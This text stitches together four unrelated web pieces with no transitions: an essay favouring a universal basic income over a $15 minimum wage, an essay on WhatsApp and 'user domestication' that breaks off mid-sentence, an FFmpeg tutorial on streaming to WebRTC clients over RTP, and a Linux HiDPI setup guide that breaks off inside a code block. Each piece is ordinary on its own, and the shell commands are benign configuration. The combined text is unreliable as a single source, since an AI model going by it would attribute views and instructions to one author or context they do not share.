<p>The <a href="https://www.bls.gov/news.release/empsit.nr0.htm?source=post_page---------------------------">latest jobs report from the BLS</a> reports a sudden acceleration of an ongoing trend of job growth, and unemployment in the US is now around 3.7 percent. Despite these impressive job numbers, <a href="https://www.brookings.edu/blog/up-front/2018/10/04/if-real-wages-arent-rising-how-is-household-income-going-up/?source=post_page---------------------------">real wages remain low</a> for American workers. Perhaps in light of this, The U.S. House of Representatives passed the <a href="https://www.washingtonpost.com/politics/house-democratic-push-to-raise-minimum-wage-opens-rift-over-amount-of-hike/2019/04/12/05711400-5d2d-11e9-98d4-844088d135f2_story.html?utm_term=.70a79b170fa0&amp;source=post_page---------------------------">Raise the Wage Act</a> this week, which reflects the goal of the <a href="https://en.wikipedia.org/wiki/Fight_for_$15?source=post_page---------------------------">Fight for $15</a> campaign: increase the federal minimum wage from $7.25 to $15 an hour.</p>
<p>The idea polls well. A <a href="https://thehill.com/hilltv/what-americas-thinking/426780-poll-a-majority-of-voters-want-a-15-minimum-wage?source=post_page---------------------------">majority of voters</a> support raising the federal minimum wage to $15 per hour as well. And most <a href="https://www.pbs.org/newshour/politics/2020-democratic-candidates-embrace-a-15-minimum-wage?source=post_page---------------------------">2020 Democratic presidential candidates</a>, including Joe Biden, Elizabeth Warren, and Bernie Sanders, support a $15 federal minimum wage too.</p>
<p>And it may seem that conditions are perfect for changing the federal minimum wage — unemployment is low, and the idea has a lot of support. But it’s worth thinking about proposals for a $15 federal minimum wage not only in light of Americans’ current economic circumstances but also in light of projected changes to the workforce going forward.</p>
<blockquote><p>A higher minimum wage may benefit people who have jobs, but it doesn’t make life easier for people who aren’t workers. This is what makes the idea of a Universal Basic Income or Negative Income Tax a more promising route. Essentially, if we are interested in helping those most in need, we should focus on policies that put cash in all people’s pockets instead of just the pockets of hourly employees.</p></blockquote>
<p>Ultimately, the advantage of these programs over a $15 minimum wage is that they benefit all citizens and do not disproportionately benefit workers and burden employers. And unlike other costly redistributive policies such as student loan forgiveness and universal healthcare, UBI is better suited to reflect each person’s distinctive circumstances, preferences, and personal values. Below, I outline several reasons why more people should consider the UBI as a viable public policy.</p>
<p>Considering the UBI over the Fight for $15</p>
<p>Overall, the UBI does not rely on maintaining our current economic order in the way that policies that focus on benefiting workers do. This is an advantage because the economy is very likely going to change radically in the next century. Though today’s workers are <a href="http://rh-us.mediaroom.com/2019-06-05-49-Of-Workers-Believe-AI-And-Automation-Will-Have-No-Impact-On-Their-Job?source=post_page---------------------------">not very concerned</a> about automation, <a href="https://www.theverge.com/2018/7/2/17524822/robot-automation-job-threat-what-happens-next?source=post_page---------------------------">economists</a> and <a href="https://www.theguardian.com/commentisfree/2018/aug/06/automation-destroy-millions-jobs-change?source=post_page---------------------------">policy experts</a> argue that they should be.</p>
<p>Even if new technology does not cause significant job losses, workplace transformations associated with new technology are likely to have significant <a href="https://www.brookings.edu/blog/techtank/2018/04/18/will-robots-and-ai-take-your-job-the-economic-and-political-consequences-of-automation/?source=post_page---------------------------">political and economic consequences</a>. Tying the provision of public benefits to participation in the workforce needlessly raises the stakes of any policy that could change the composition of the workforce, and therefore increases the political and economic risks associated with automation. Moreover, the UBI doesn’t limit its benefits to people who are engaged in paid employment. This has four benefits that a higher minimum wage does not.</p>
<p>First, a UBI would benefit people who do valuable unpaid labor, such as childcare and eldercare, as well as people who are employees.</p>
<p>Second, a UBI would not interfere with workers’ and employers’ freedom to set the terms and conditions of their labor. If it is possible to benefit low-income Americans without restricting their freedom to negotiate the terms and conditions of their employment relationships, officials should favor the less restrictive policies.</p>
<p>Third, a UBI would not tie people to their employers. This means that a basic income would potentially enable more economic mobility, enhance workers’ bargaining power, and enable people to stop working if they need to leave the workforce due to disability or caregiving obligations.</p>
<p>Fourth, policies that do not tie assistance to employment would not disproportionately burden employers. The debate over minimum wage increases is often framed as if employers are failing to benefit workers sufficiently. But low-wage work often helps low-skill workers more than anyone else. Without these employment opportunities, they would be even less capable of meeting their basic needs. If the justification for a higher minimum wage is that everyone should be able to support themselves, why should employers bear the full cost of meeting that goal? In contrast, a basic income enables citizens to share the cost of supporting a social safety net rather than treating employers as the only way to achieve it.</p>
<p>A significant benefit of a UBI, in contrast to other recent entitlement reforms such as student loan forgiveness and universal healthcare, is that it doesn’t tell people how to spend it. People have different values, but in-kind benefits assume that all people have the same interest in healthcare or being debt-free. This may be broadly true, but there are tradeoffs. Given the cost of these programs, it’s fair to ask whether people would be better off if we just gave them the money instead. But evidence from developing countries suggests that<a href="https://www.nytimes.com/2014/06/30/opinion/let-them-eat-cash.html?source=post_page---------------------------"> cash does help people better than alternatives</a>.</p>
<p>As I see it, the main challenge to a Basic Income proposal is affordability. Estimates vary, and some argue that a UBI would be <a href="https://socialprotection-humanrights.org/resource/universal-basic-income-proposals-in-light-of-ilo-standards-key-issues-and-global-costing-ess-%e2%94%80-working-paper-no-62/?source=post_page---------------------------">catastrophically</a> <a href="https://www.economist.com/finance-and-economics/2015/05/23/basically-unaffordable?source=post_page---------------------------">expensive</a> whereas others suggest that it is “<a href="https://medium.com/basic-income/basic-income-is-easily-affordable-8389995528b3?source=post_page---------------------------">easily affordable</a>.” Plausibly, while a UBI would save on administrative costs, it does seem that funding sustainable UBI could require making some <a href="https://www.forbes.com/sites/timworstall/2016/06/04/of-course-we-can-afford-a-universal-basic-income-do-we-want-one-though/?source=post_page---------------------------#50c7d99f323c">hard choices</a> about other social programs such as healthcare, education, and defense.</p>
<p>The UBI and Social Security</p>
<p>UBI may seem like a radical idea, but there’s a precedent for it in America. Elderly people already receive what is effectively a basic income through Social Security. Some of them continue to work, while others use their basic income (and retirement savings) to pay their bills so that they can focus on spending time with loved ones or pursuing new hobbies. Some elderly people are disabled, and Social Security enables them to leave the workforce.</p>
<p>Yet older voters <a href="https://thehill.com/hilltv/what-americas-thinking/435278-poll-most-voters-oppose-a-universal-basic-income-programs?source=post_page---------------------------">consistently</a> <a href="https://thehill.com/policy/technology/375587-gallup-poll-americans-split-on-giving-a-universal-basic-income-to-workers?source=post_page---------------------------">oppose</a> Universal Basic Income proposals while younger voters are in favor of it. Even more curiously, older voters <a href="https://www.pollingreport.com/social.htm?source=post_page---------------------------">consistently</a> <a href="https://socialsecurityworks.org/2019/03/26/social-security-polling/?source=post_page---------------------------">oppose</a> cuts to their basic income, Social Security. The difficult position for older voters is that the reasons for opposing a basic income are also reasons to oppose social security. And those who support Social Security should support a basic income as well. Those who oppose the UBI should rethink their support for Social Security. If anything, the case for a UBI is stronger than the case for Social Security because as it is currently structured, <a href="https://www.nber.org/digest/may00/w7520.html?source=post_page---------------------------">Social Security may be a slightly regressive policy</a>, in part <a href="https://www.latimes.com/business/hiltzik/la-fi-hiltzik-mortality-social-security-20180912-story.html?source=post_page---------------------------">because wealthy people live longer.</a></p>
<p><a href="https://bleedingheartlibertarians.com/2014/09/political-authority-and-the-basic-income/?source=post_page---------------------------">Elsewhere</a>, I have argued in favor of a basic income because it is a kind of compensation for the injustices associated with our existing property system. In contrast, minimum wage requirements only compound the injustices of the current system by doubling down on the idea that elevates paid employment over other kinds of potentially valuable work, discourages opportunities for low-skilled workers, and leaves non-workers out of the social safety net. A basic income is more respectful of people’s freedom, more sensitive to recipients’ values, and better suited for a rapidly changing economy.</p>

			<p>I have never used WhatsApp, and never will. Despite this, I still feel the need to write an article about WhatsApp since it’s the perfect case study to help understand a class of businesses models I call “user domestication”. The domestication of users is high on my list of problems plaguing the human race, and is worth a detailed explanation.</p>
<p>WhatsApp wasn’t the first instant messenger of its kind, and probably won’t be the last. I simply chose to focus on WhatsApp since its recent privacy issues have made it a hot topic.</p>
<p>With the meta-explanation out of the way, let us begin.</p>
<h2 id="whatsapps-rise">WhatsApp’s rise</h2>
<p>For those unfamiliar, WhatsApp is a tool that makes it convenient and easy to help Facebook further its core mission: the optimization and auctioning of human behavior (colloquially known as “targeted advertising”). It originally persuaded people to consent to this by allowing them to send text to each other over the Internet, something that was <a href="https://en.wikipedia.org/wiki/Comparison_of_instant_messaging_protocols">already possible</a>, and combining an easy-to-learn UI with successful marketing. It then expanded to include features such as free voice and video calls. Free calls helped it grow to become the de-facto communication platform many regions. I’m stunned at its ubiquity every time I visit my extended family in India; I’m frequently greeted by looks of confusion when I remind them that I don’t use WhatsApp.</p>
<p>Having its own proprietary chat system incompatible with other clients allowed WhatsApp to build a <a href="https://en.wikipedia.org/wiki/Network_effect">network effect</a>: WhatsApp’s existing users were held captive by the fact that leaving WhatsApp meant losing the ability to communicate with WhatsApp users. People switching from WhatsApp must convince all their friends to switch, too; this includes less technically inclined friends who had a hard time learning WhatsApp in the first place.</p>
<p>In a WhatsApp world, people who want to keep in touch must abide by the following rules:</p>
<ul>
<li>Everyone can only use the proprietary WhatsApp client to send messages; developing alternative clients isn’t supported.</li>
<li>Everyone’s mobile device must run an operating system supported by said client. Since WhatsApp developers will only write a client for popular operating systems, the Android and iOS duopoly strengthens.</li>
<li>Users fully depend on WhatsApp developers. If WhatsApp developers decide to include user-hostile features in the app, users must go with it. They can’t switch to a different server or client without switching away from WhatsApp and losing the ability to communicate with all their WhatsApp contacts.</li>
</ul>
<h2 id="user-domestication">User domestication</h2>
<p>WhatsApp rose by trapping previously-free beings in their corral and changing their habits to create dependence on masters. Over time, this made it difficult or impossible to return to their previous lifestyle. That process should sound familiar: it’s eerily similar to the domestication of animals. I call this type of vendor lock-in <strong>user domestication:</strong> the removal of user autonomy to trap users into serving vendors.</p>
<p>I chose this metaphor because animal domestication is a gradual process that isn’t always deliberate, and typically revolves around one group becoming dependent upon another. For example: there’s evidence that domestication of dogs began with socialization, resulting in not-entirely-artificial selection promoting genes that resulted in more friendliness with and dependence upon humans.<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup></p>
<p>Whether it happens on purpose or by accident, user domestication almost always follows the same three steps:</p>
<ol>
<li>A high level of dependence given from users to a software vendor</li>
<li>An inability for users to control their software, through at least one of the following methods:
<ol>
<li>Preventing modification of the software</li>
<li>Preventing migration onto a different platform</li>
</ol>
</li>
<li>The exploitation of now-captive users who are unable to resist</li>
</ol>
<p>The completion of the first two steps left WhatsApp users vulnerable to user domestication. With investors to answer to, they had every incentive to implement user-hostile features without consequence.</p>
<p>So, of course, they did.</p>
<h2 id="whatsapps-descent">WhatsApp’s descent</h2>
<p>Domestication has a purpose: it enables a master species to exploit the domesticated species for its own gain.</p>
<p>Recently, WhatsApp updated its privacy policy to allow sharing data with its parent, Facebook. Users who agreed to use WhatsApp under its previous privacy policy had two options: agree to the new policy or be unable to use WhatsApp again. The WhatsApp privacy policy update is a classic bait-and-switch: WhatsApp lured users in with a sleek interface and the impression of privacy, domesticated them to remove their autonomy to migrate, and then backtracked on its previous commitment to privacy with minimal consequence. Each step in this process enabled the next; had user domestication not taken place, it would be easy for most users to switch away with minimal friction.</p>
<p>Those of us who were sounding the alarm a few years ago experienced a brief moment of sadistic bliss when our titles were upgraded from “annoying and paranoid conspiracy theorists” to just “annoying”.</p>
<h3 id="an-attempt-at-damage-control">An attempt at damage control</h3>
<p>The bait-and-switch operation incurred backlash significant enough for a noticeable minority of users to actually migrate; this number turned out to be slightly more than the rounding error WhatsApp was likely expecting. In response, WhatsApp delayed the change and published the following ad:</p>
<picture>
	<source srcset="https://seirdy.one/p/whatsapp_ad_dark.3e9ad6a0c2c8c377c4583cf92bddcd47.avif" type="image/avif" media="(prefers-color-scheme: dark)">

	<source srcset="https://seirdy.one/p/whatsapp_ad.94ed78578e240dfd57f833807f8167ed.avif" type="image/avif">

	<img width="600" src="https://seirdy.one/p/whatsapp_ad.png" alt="WhatsApp ad describing data not collected">
</picture>

<p>The ad lists various data that WhatsApp doesn’t collect or share. Allaying data collection concerns by listing data <em>not</em> collected is misleading. WhatsApp doesn’t collect hair samples or retinal scans either; not collecting that information doesn’t mean it respects privacy because it doesn’t change the information WhatsApp <em>does</em> collect.</p>
<p>The ad denies “keep[ing] logs of who everyone is messaging or calling”. Collecting data is not the same as “keeping logs”; it’s possible for metadata to be fed into an algorithm before being discarded. A model can thus learn that two users call each other frequently without keeping logs of the metadata for each call. The fact that they specifically chose to phrase this line around logging implies that WhatsApp either already collects this class of data or has deliberately left the door open to collecting it in the future.</p>
<p>A stroll through WhatsApp’s <a href="https://web.archive.org/web/20210124061525/https://www.whatsapp.com/legal/updates/privacy-policy/?lang=en">actual privacy policy</a> at the time reveals that they do collect considerable metadata used for marketing through Facebook.</p>
<h2 id="software-freedom">Software freedom</h2>
<p>With user domestication, providing useful software to users is a means to the end of exploiting them. The alternative is simple: make serving users the end in and of itself.</p>
<p>To prevent being controlled by software, users must be in control. Software that allows users to be in control is called <a href="https://en.wikipedia.org/wiki/Free_software">free software</a>. The word “free” in this context refers to freedom rather than price. Software freedom is similar to the concept of open-source, but the latter is focused on practical benefits rather than ethics. A less ambiguous term that neutrally refers to both free and open-source software is <strong><abbr title="free and open-source software">FOSS</abbr></strong>.</p>
<p>Others have <a href="https://www.gnu.org/philosophy/free-sw.en.html">explained</a> the concepts underpinning free software better than I can, so I won’t go into detail. It comes down to four essential freedoms:</p>
<ul>
<li>The freedom to run the program as you wish, for any purpose</li>
<li>The freedom to study how the program works, and change it so it does your computing as you wish</li>
<li>The freedom to redistribute copies so you can help others</li>
<li>The freedom to distribute copies of your modified versions to others</li>
</ul>
<h3 id="making-money-with-foss">Making money with FOSS</h3>
<p>The most common objection I hear is that FOSS makes it harder to make money.</p>
<p>The key to making money with FOSS is to make software a <a href="https://www.gwern.net/Complement">commoditized complement</a> of other, more profitable services. Examples of such services include selling support, customization, consulting, training, managed hosting, hardware, and certifications. Plenty of companies use this approach instead of building proprietary software: Red Hat, Collabora, System76, Purism, Canonical, SUSE, Hashicorp, Databricks, and Gradle are some names that come to mind.</p>
<p>Managed hosting isn’t a basket worth all your eggs if giants like AWS can do the same at a lower price. Being the developer can give an edge in areas like customization, support, and training; it doesn’t offer as obvious an advantage when it comes to hosting.</p>
<h2 id="foss-isnt-always-enough">FOSS isn’t always enough</h2>
<p>Free software is a necessary but sometimes insufficient requirement to build domestication immunity. Two more measures include <strong>simplicity</strong> and <strong>open platforms.</strong></p>
<h3 id="simplicity">Simplicity</h3>
<p>When software grows too complex, it needs to be maintained by a large team. Users who disagree with a vendor can’t easily fork and maintain a multi-million-line codebase, especially if the software in question potentially contains security vulnerabilities. Dependence on the vendor can grow quite problematic when complexity causes development costs to skyrocket; the vendor might resort to implementing user-hostile features to stay afloat.</p>
<p>Complex software that can’t be developed by a different group of people creates dependence, step one of user domestication. That alone is enough to open the door to problematic developments.</p>
<h4 id="case-study-mozilla-and-the-web">Case study: Mozilla and the Web</h4>
<p>Mozilla was a ray of hope in the browser wars, a space dominated by adtech, surveillance, and vendor lock-in. Unfortunately, developing a browser engine is a monumental task difficult enough for Opera and Microsoft to give up and re-skin Chromium. Browsers are more than the document readers they were meant to be: they’ve evolved into application runtimes with their own stacks for GPU acceleration, Bluetooth, permissions, device enumeration, bundled media codecs, <abbr title="digital rights management">DRM</abbr><sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>, extension APIs, developer tools…the list goes on. It takes billions of dollars a year to respond to vulnerabilities in such a massive attack surface and keep up with a standard that grows at such a worrying rate. Those billions have to come from somewhere.</p>
<p>Mozilla ended up having to make major compromises to stay afloat. It cut search deals with blatantly user-hostile companies, and bundled the browser with <a href="https://blog.mozilla.org/advancingcontent/2014/02/11/publisher-transformation-with-users-at-the-center/">ads</a> and bloatware such as a partially …</p></section></article></div></div>

<p><strong>Note: </strong>The original version of this post highlighted the disadvantages of using a fixed key frame interval. I’ve since learned that this problem can be avoided using intra refresh in the H264 stream.</p>



<p>Streaming media. specifically video, is a fickle beast. This will be a short post, but it will cover everything you need to know to stream media using FFmpeg to WebRTC clients. This technique has many applications, such as streaming synchronized videos to users. </p>



<h2>Setting up the input</h2>



<p>Before inputting a file into FFmpeg, we need to pass a few flags:</p>



<pre><code>&gt; ffmpeg \
  -v info \
  -fflags +genpts \
  -protocol_whitelist pipe,tls,file,http,https,tcp,rtp \</code></pre>



<p>These flags set the log level to info, generate pts if they’re missing, and sets up the protocols we can use. Next we need to provide the input to FFmpeg.</p>



<pre><code>-i in.mp4</code></pre>



<p>In this example, a file name <code>in.mp4</code> is used, but a http(s) URL could also be used. This command starts playback at the beginning of the input file. If you want to start playback in the middle of the input file, then you can add the <code>-ss &lt;time in secs&gt;</code> flag <strong>before</strong> <code>-i</code>.</p>



<h2>Video arguments</h2>



<p>Now the video needs to be converted to an appropriate format for streaming. The format is specific to the application, but common codecs are H264, VP8, and VP9. This example uses H264 due to its ubiquitous support.</p>



<pre><code>-vf realtime,scale=w=min(iw\,1280):h=-2 \
-map 0:v:0 \
-c:v libx264 \
-x264-params intra-refresh=1,fast-pskip=0
-threads 3 \
-profile:v baseline \
-level:v 3.1 \
-pix_fmt yuv420p \
-tune zerolatency \
-minrate 500K \
-maxrate 1.3M \
-bufsize 500K \</code></pre>



<p><code>-vf</code> specifies the video filters to apply. Here, two filters are applied. The first is <code>realtime</code>, which causes playback to happen in real time, which is necessary for streaming. This filter is similar to the <code>-re</code> flag, but works much better with the start time flag (<code>-ss</code>). The second filter scales the video width to a maximum of 1280 pixels while maintaining the aspect ratio. This is important to keep the bitrate appropriate for real time streaming. </p>



<p>The <code>intra-refresh</code> parameter allows users to consume the video stream mid-way through by providing enough metadata over multiple inter frames to decode a full frame. The <code>fast-pskip=0</code>is required for <code>intra-refresh</code> to work if the source video files contains very few frames, which can happen if the video displays static images for long periods of time. There may be another way around this, but I’m not aware of it. </p>



<p>Another important parameter is the <code>-threads 3</code> flag. FFmpeg will use many threads by the default. Normally, this is good because it produces the final result as fast as possible. For real time encoding, however, using a large number of threads has some overhead that can slow down real time output. Using many threads is also a bad idea if you’re running multiple instances of FFmpeg concurrently.</p>



<p>The next two parametrs <code>-profile:v</code> and <code>-level:v</code> specify the profile and level to use for the encoding. These are specific to H264. WebRTC clients can only decode certain profiles and levels, so these need to match the specific configuration of the application. These roughly correspond to the profile-level-id of <code>42e01f</code>. </p>



<p>The pixel format is set to <code>yuv420p</code> using the <code>-pix_fmt</code> flag. This is required as this is the only pixel format supported by WebRTC. <code>-tune zerolatency</code> tunes the encoder for low latency streaming.</p>



<p>Next up are the bitrate parameters. When streaming media, the bitrate should be as low as possible while maintaining the desired quality. This ensures all clients can consume the video in real time. Omitting the <code>-minrate</code> parameter can cause FFmpeg to produce output with an unnecessarily high bitrate. Setting the <code>-maxrate</code> is equally important. A DSL connection can only pull down around 2 Mbps. In order for users to watch the video, they must be able to download it in real time, so the maximum bitrate has to be lower than the slowest connection among your users. Another consideration is that the streaming video might not be the only bandwidth consuming task on the user’s network.</p>



<h2>Audio arguments</h2>



<p>The audio arguments are much simpler.</p>



<pre><code>-af arealtime \
-map 0:a:0 \
-c:a libopus \
-ab 128k \
-ac 2 \
-ar 48000 \</code></pre>



<p>The main thing to note here is that the <code>arealtime</code> filter is used, which is similar to the <code>realtime</code> filter, but for audio.</p>



<h2>Output arguments</h2>



<p>The output can be piped to an RTP endpoint using the <code>tee</code> psuedomuxer. Unfortunately, FFmpeg does not support multiplexing over RTP, so you’ll need two separate RTP endpoints, one for the video stream and one for the audio stream. </p>



<pre><code>-f tee \
[select=a:f=rtp:ssrc=1111:payload_type=&lt;audio-payload_type&gt;]rtp://&lt;audio-ip&gt;:&lt;audio-port&gt;?rtcpport=&lt;audio-rtcpport&gt;|[select=v:f=rtp:ssrc=2222:payload_type=&lt;video-payload_type&gt;]rtp://&lt;video-ip&gt;:&lt;video-port&gt;?rtcpport=&lt;video-rtcpport&gt;</code></pre>



<p>Now you can stream video over RTP! The full command is</p>



<pre><code>&gt; ffmpeg \
  -v info \
  -fflags +genpts \
  -protocol_whitelist pipe,tls,file,http,https,tcp,rtp \
  -i in.mp4
  -vf realtime,scale=w=min(iw\,1280):h=-2 \
  -map 0:v:0 \
  -c:v libx264 \
  -x264-params intra-refresh=1,fast-pskip=0
  -threads 3 \
  -profile:v baseline \
  -level:v 3.1 \
  -pix_fmt yuv420p \
  -tune zerolatency \
  -minrate 500K \
  -maxrate 1.3M \
  -bufsize 500K \
  -af arealtime \
  -map 0:a:0 \
  -c:a libopus \
  -ab 128k \
  -ac 2 \
  -ar 48000 \
  -f tee \
  [select=a:f=rtp:ssrc=1111:payload_type=&lt;payload_type&gt;]rtp://&lt;ip&gt;:&lt;port&gt;?rtcpport=&lt;rtcpport&gt;|[select=v:f=rtp:ssrc=2222:payload_type=&lt;payload_type&gt;]rtp://&lt;ip&gt;:&lt;port&gt;?rtcpport=&lt;rtcpport&gt;</code></pre>
                                                            </div>

  </p>


<h2 id="background">Background</h2>

<p>I recently switched my home office to a 2-by-4K HiDPI setup, like so:</p>

<p><a href="https://blog.yossarian.net/assets/hidpi-setup.jpg"><img src="https://blog.yossarian.net/assets/hidpi-setup.jpg" alt="A picture of my home office."></a></p>

<p>As part of that switch, I needed to configure parts of my Linux environment (which was originally
stock Ubuntu, but is now <a href="https://i3wm.org/">i3</a> with a heavily customized userspace) to function
correctly on HiDPI displays.</p>

<p>This post will document most of the changes I applied. Hopefully others will find it useful for
their own HiDPI setups.</p>

<h2 id="90-of-the-way-x11-resources">90% of the way: X11 resources</h2>

<p>As it turns out, there’s a (nearly) one-stop location for configuring the default DPI for
X11 applications: the <code>Xft.dpi</code> setting.</p>

<p>There are lots of ways to configure X11, but I personally use an <code>~/.Xresources</code> file:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
</pre></td><td><pre><span>Xft</span>.<span>dpi</span>: <span>163</span>
<span># not used directly; more on this later
</span><span>janus</span>.<span>fractionalDpi</span>: <span>1</span>.<span>63</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Where <code>163</code> and <code>1.63</code> are my DPI and its fractional form, respectively.</p>

<p>On my system, <code>~/.Xresources</code> gets loaded into the X resource database automatically by some
magic that I never configured. However, if yours doesn’t (or you use a different resource file),
you can always tell i3 (or your WM of choice) to load it explicitly with <code>xrdb</code>.</p>

<p>For example, in <code>~/.config/i3/config</code>:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
</pre></td><td><pre><span>exec</span> <span>--no-startup-id</span> xrdb ~/.Xresources
</pre></td></tr></tbody></table></code></pre></div></div>

<p>With just this, about 90% of my applications (including GTK based ones, like Firefox) scaled
correctly and were usable without any font or custom scaling changes. Not bad for a single line!</p>

<h2 id="per-application-fixes">Per-application fixes</h2>

<h3 id="spotify">Spotify</h3>

<p>Spotify’s Linux application is a <a href="https://bitbucket.org/chromiumembedded/cef/src/master/">CEF</a>
shell. For reasons that are unclear to me, it doesn’t respect <code>Xft.dpi</code> while normal Chromium
(via <code>snap</code> or <code>apt</code>) does.</p>

<p>To get it to scale correctly, I needed to pass <code>--force-device-scale-factor=1.63</code> to it:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
</pre></td><td><pre>spotify <span>--force-device-scale-factor</span><span>=</span>1.63
</pre></td></tr></tbody></table></code></pre></div></div>

<p>At this point, it became clear to me that the fractional form of my DPI would be nice to set in
as few places as possible, to avoid duplication. Hence the <code>janus.fractionalDpi</code><sup id="fnref:hostname" role="doc-noteref"><a href="#fn:hostname">1</a></sup> above,
and
<a href="https://github.com/woodruffw/dotfiles/blob/master/scripts/spotify">this little <code>spotify</code> wrapper</a>:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
</pre></td><td><pre><span># see the actual script linked above for some program-finding stupidity</span>
<span>real_spotify</span><span>=</span>/snap/bin/spotify

<span># grab the correct fractional DPI from the X resource DB</span>
<span>dpi</span><span>=</span><span>$(</span>xrdb <span>-query</span> | <span>grep</span> <span>"</span><span>$(</span><span>hostname</span><span>)</span><span>.fractionalDpi"</span> | <span>cut</span> <span>-f2</span><span>)</span>
<span>"</span><span>${</span><span>real_spotify</span><span>}</span><span>"</span> <span>--force-device-scale-factor</span><span>=</span><span>"</span><span>${</span><span>dpi</span><span>}</span><span>"</span> <span>"</span><span>${</span><span>@</span><span>}</span><span>"</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<h3 id="sublime-text">Sublime Text</h3>

<p>I use <a href="https://www.sublimetext.com/3">Sublime Text 3</a> as my primary editor. As far as I can tell
it doesn’t use either GTK or Qt (or any other open-source GUI framework), which is probably why
it doesn’t respect <code>Xft.dpi</code>.</p>

<p>To get Sublime Text to scale correctly, I had to set <code>ui_scale</code> to the appropriate fractional DPI
in my user preferences (<code>~/.config/sublime-text-3/Preferences.sublime-settings</code>):</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
</pre></td><td><pre><span>{</span><span>
  </span><span>"ui_scale"</span><span>:</span><span> </span><span>1.63</span><span>,</span><span>
</span><span>}</span><span>
</span></pre></td></tr></tbody></table></code></pre></div></div>

<p>Some lingering pain points:</p>

<ul>
  <li>
    <p>Sublime Text’s input is noticeably laggy when the UI is scaled. It’s not so laggy as to be
unusable, but it’s definitely noticeable even if you aren’t sensitive to latencies (I’m not).</p>
  </li>
  <li>
    <p>Mousing between Sublime Text and other windows causes noticeable stutter/hiccuping during
video playback. I haven’t dug into the X events yet, but my guess is that it’s got some kind
of pessimistic (and serial) <code>XFlush</code> or <code>XSync</code> that takes a decent bit of time on a larger window
buffer. It doesn’t happen with smaller windows (either floating or fixed).</p>
  </li>
</ul>

<h3 id="open-broadcaster-software-obs">Open Broadcaster Software (OBS)</h3>

<p>I haven’t used it recently, but I used to use <a href="https://obsproject.com/">OBS</a> to stream myself
working on open source projects.</p>

<p>When I switched monitors, I noticed that the embedded preview window for my scenes had stopped
working. OBS <em>itself</em> was still fully functional and the <em>separate</em> preview window still worked,
but the embedded preview was always filled in with black pixels.</p>

<p>After a decent bit of hair-pulling, I found a Qt environment variable that “fixed” it:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
</pre></td><td><pre><span>QT_AUTO_SCREEN_SCALE_FACTOR</span><span>=</span>0 obs
</pre></td></tr></tbody></table></code></pre></div></div>

<p>I still don’t understand why that fixed it, but now my OBS is scaled correctly <strong>and</strong> has a
functional preview embed. I also posted this fix to the
<a href="https://obsproject.com/forum/threads/bug-fix-black-preview-embed-window-on-linux-w-hidpi-monitors.135041/">OBS forum</a>.</p>

<h3 id="feh">feh</h3>

<p>I use <a href="https://github.com/derf/feh"><code>feh</code></a> as my image viewer. By default, it seems to use
a bitmap font that’s incredibly small on HiDPI displays.</p>

<p>To fix it, I modified by default theme to use my distro supplied Ubuntu Roman-face font in
14pt.</p>

<p>In <code>~/.config/feh/themes</code>:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
</pre></td><td><pre>feh <span>--borderless</span> <span>--scale-down</span> <span>--conversion-timeout</span> 1 <span>\</span>
  <span>--fontpath</span> /usr/share/fonts/truetype/ubuntu <span>--menu-font</span> Ubuntu-R/14
</pre></td></tr></tbody></table></code></pre></div></div>

<p>One thing I haven’t figured out: when I open some higher-resolution images in <code>feh</code>, they’re
occasionally shifted to the right with transparent pixels where some of the image should be.
Clicking and dragging inside the image window causes it to re-render correctly, as does
resizing the window. Not a huge deal, but slightly annoying.</p>

<h3 id="dunst">dunst</h3>

<p>I use <a href="https://dunst-project.org/"><code>dunst</code></a> as my notification daemon.</p>

<p>It didn’t <strong>need</strong> any HiDPI-specific configuration, but I took the opportunity to make its
notifications slightly more readable on these newer displays.</p>

<p>In <code>~/.config/dunst/dunstrc</code> (among many other settings):</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
</pre></td><td><pre><span>monitor</span> = <span>0</span>
<span>follow</span> = <span>mouse</span>
<span>geometry</span> = <span>"600x120-30+20"</span>
<span>icon_position</span> = <span>left</span>
<span>max_icon_size</span> = <span>64</span>
<span>icon_path</span> = /<span>usr</span>/<span>share</span>/<span>icons</span>/<span>gnome</span>/<span>64</span><span>x64</span>/<span>status</span>/:/<span>usr</span>/<span>share</span>/<span>icons</span>/<span>gnome</span>/<span>64</span><span>x64</span>/<span>devices</span>/
</pre></td></tr></tbody></table></code></pre></div></div>

<h2 id="other-bits">Other bits</h2>

<h3 id="mouse-acceleration">Mouse acceleration</h3>

<p>My new displays are individually larger and significantly more dense than my previous ones, making
my mouse feel sluggish. I originally configured my mouse acceleration with
<a href="https://www.x.org/archive/X11R7.5/doc/man/man1/xset.1.html"><code>xset</code></a>, but at some point my
system switched to <code>libinput</code> and <code>libinput</code>-based inputs apparently don’t respect <code>xset</code> anymore
(or never did?). Sigh.</p>

<p>The fix is to use <code>xinput</code> instead, with either symbolic names or XIDs for the device and setting
being controlled. For example, this is what I use to set my mouse’s acceleration to the maximum
(<code>1.0</code>):</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
</pre></td><td><pre>xinput <span>--set-prop</span> <span>"USB Optical Mouse"</span> <span>"libinput Accel Speed"</span> 1.0
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Your device and setting names may vary, of course, as may their value ranges (mine happened to be
<code>0.0</code> to <code>1.0</code>). You can use <code>xinput</code> on its own to list the names and XIDs of your devices;
<code>xinput list-props &lt;XID-or-name&gt;</code> can be used to dump a particular device’s properties and
their current values.</p>

<h3 id="i3-workspaces">i3 workspaces</h3>

<p>I use i3’s <a href="https://i3wm.org/docs/layout-saving.html">layout saving/restoring</a> functionality
to automatically load all of my workspaces and their applications when I log in.</p>

<p>Those layouts are stored in a (relaxed) JSON format via <code>i3-save-tree</code>, and contain hardcoded
coordinates. To update them for my new monitors, I just had to recreate each of my workspaces
once on my new monitors and dump them:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
</pre></td><td><pre><span># for each workspace (1A, 1B, ...)</span>
